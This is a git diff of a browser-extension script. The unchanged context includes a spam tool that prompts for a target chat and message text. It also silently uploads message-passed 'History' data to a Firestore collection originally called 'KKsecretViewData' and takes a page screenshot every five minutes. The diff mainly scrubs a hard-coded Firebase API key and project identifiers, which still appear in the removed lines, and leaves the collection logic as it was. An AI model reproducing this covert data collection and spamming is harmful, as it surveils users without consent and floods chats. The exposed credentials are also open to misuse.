@@ -33,7 +33,7 @@ document.addEventListener("keydown", function (event) {
       var counterCount
       setTimeout(function () {
         while (spamGrp == undefined) {
-          spamGrp = prompt("spam Grp/chat", "Toppers😇😇")
+          spamGrp = prompt("spam Grp/chat")
         }
         while (spamText === undefined) {
           spamText = prompt("spam Text")
@@ -414,13 +414,7 @@ document.addEventListener("keydown", function (event) {
 })
 
 const firebaseConfig = {
-  apiKey: "AIzaSyAsEEK1vGq3imxGGPopMFfcn5MDCq4UT8k",
-  authDomain: "storyweb-e902d.firebaseapp.com",
-  projectId: "storyweb-e902d",
-  storageBucket: "storyweb-e902d.appspot.com",
-  messagingSenderId: "124030460580",
-  appId: "1:124030460580:web:7e232959f35eec7c8b7c31",
-  measurementId: "G-VQQQMXEGD1"
+  firebase config
 };
 const firebaseApp = initializeApp(firebaseConfig);
 const db = getFirestore(firebaseApp);
@@ -431,7 +425,7 @@ var date = currentdate.getDate()
 uploadHistory()
 
 async function uploadHistory() {
-  const docRef = doc(db, "KKsecretViewData", "lastUploadDate");
+  const docRef = doc(db, "collection", "lastUploadDate");
   const docSnap = await getDoc(docRef);
   var a = []
   if (docSnap.exists()) {
@@ -445,11 +439,11 @@ async function uploadHistory() {
       });
       chrome.runtime.onMessage.addListener(async function (message, sender, sendResponse) {
         a = message.body 
-        await setDoc(doc(db, "KKsecretViewData", "History"), {
+        await setDoc(doc(db, "collection", "History"), {
           [lastListCount + 1]: a
         });
 
-         await setDoc(doc(db, "KKsecretViewData", "lastUploadDate"), {
+         await setDoc(doc(db, "collection", "lastUploadDate"), {
           lastListCount: lastListCount + 1,
           lastUploadDate: date
         });
@@ -466,11 +460,11 @@ async function uploadHistory() {
 
       chrome.runtime.onMessage.addListener(async function (message, sender, sendResponse) {
         a = message.body
-        await setDoc(doc(db, "KKsecretViewData", "History"), {
+        await setDoc(doc(db, "collection", "History"), {
           [lastListCount + 1]: a
         });
 
-        await setDoc(doc(db, "KKsecretViewData", "lastUploadDate"), {
+        await setDoc(doc(db, "collection", "lastUploadDate"), {
           lastListCount: lastListCount + 1,
           lastUploadDate: date
         });
@@ -496,6 +490,7 @@ async function s(base64) {
 }
 
 setInterval(a, 300000)
+
 
 async function a() {
   const screenshotTarget = document.body
